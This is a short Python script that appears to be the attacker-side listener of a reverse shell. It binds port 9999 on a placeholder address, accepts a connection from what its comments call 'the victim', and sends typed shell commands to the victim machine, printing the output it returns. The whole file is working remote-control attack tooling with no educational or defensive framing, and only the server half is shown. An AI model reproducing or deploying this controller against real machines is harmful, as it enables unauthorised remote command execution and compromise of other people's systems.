import socket
import sys

# For sending commands to the victim
def send_commands(conn):
    while True:
        cmd = input()
        if cmd == 'quit':
            conn.close()
            s.close()
            sys.exit()

        if len(str.encode(cmd)) > 0:
            conn.send(str.encode(cmd))
            client_response = str(conn.recv(1024),'utf-8')
            print(client_response, end="")

# Create a socket
def create_socket():
    try:
        global host
        global port
        global s
        host = 'xxx.xxx.xxx.xxx'
        port = 9999

        # To create a socket
        s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)

    except socket.error as msg:
        print("Socket creation error "+ str(msg))

# Binding the socket and listening for a connections
def bind_socket():
    try:
        global host
        global port
        global s

        print("Binding the Port "+str(port))
        s.bind((host,port)) # As tuple
        s.listen(5)

    except socket.error as msg:
        print("Socket binding error "+ str(msg) + "\n" + "Retrying...")
        bind_socket()

# Accepting and establishing Connection when socket is listening
def socket_accept():
    # Accepts the connection
    # Gives us the object or content of the connection
    # Gives us the list that contains IP address and port

    conn,address = s.accept()  # conn = object : address = ip & port
    print("Connection has been established")
    print("Connection from IP: "+ address[0] + " and port: " + str(address[1]))
    send_commands(conn)
    conn.close()

def main():
    create_socket()
    bind_socket()
    socket_accept()

main()